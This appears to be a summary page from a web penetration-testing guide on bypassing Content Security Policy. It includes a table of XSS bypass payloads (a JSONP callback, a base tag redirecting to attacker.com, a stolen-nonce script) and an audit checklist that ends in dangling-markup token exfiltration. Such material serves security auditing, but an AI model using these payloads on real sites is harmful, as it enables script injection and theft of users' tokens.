# CSP Bypass Techniques

> This page summarizes CSP bypass methodology. For full technical details and payload lists, see:
> - [`techniques/04-csp-bypass.md`](../techniques/04-csp-bypass.md) — technique deep-dives
> - [`payloads/csp-bypass.txt`](../payloads/csp-bypass.txt) — ready-to-use payloads

---

## Quick Reference

| Misconfiguration | Bypass | Technique File |
|-----------------|--------|----------------|
| Whitelisted domain with JSONP | `<script src="whitelisted.com/jsonp?callback=alert(1)">` | [04-csp-bypass.md §2](../techniques/04-csp-bypass.md) |
| Angular 1.x on allowlisted CDN | Template expression sandbox escape | [04-csp-bypass.md §3](../techniques/04-csp-bypass.md) |
| Missing `base-uri` directive | `<base href="https://attacker.com/">` | [04-csp-bypass.md §4](../techniques/04-csp-bypass.md) |
| Static or reused nonce | `<script nonce="STOLEN">alert(1)</script>` | [04-csp-bypass.md §5](../techniques/04-csp-bypass.md) |
| HTML injection without script exec | Dangling markup → nonce exfil | [04-csp-bypass.md §6](../techniques/04-csp-bypass.md) |
| `strict-dynamic` + trusted script gadget | Dynamic `<script>` from nonced script | [04-csp-bypass.md §7](../techniques/04-csp-bypass.md) |

---

## Audit Flow

```
1. Read the CSP header (curl -I target.com | grep -i content-security-policy)
2. Run through CSP Evaluator: https://csp-evaluator.withgoogle.com/
3. Check for: unsafe-inline, unsafe-eval, * wildcard, missing base-uri, missing object-src
4. Enumerate whitelisted domains → check each for JSONP endpoints (JSONBee database)
5. Check whitelisted domains for script gadgets (Angular, jQuery, Lodash CDN URLs)
6. If none of the above: try dangling markup for token exfil
```
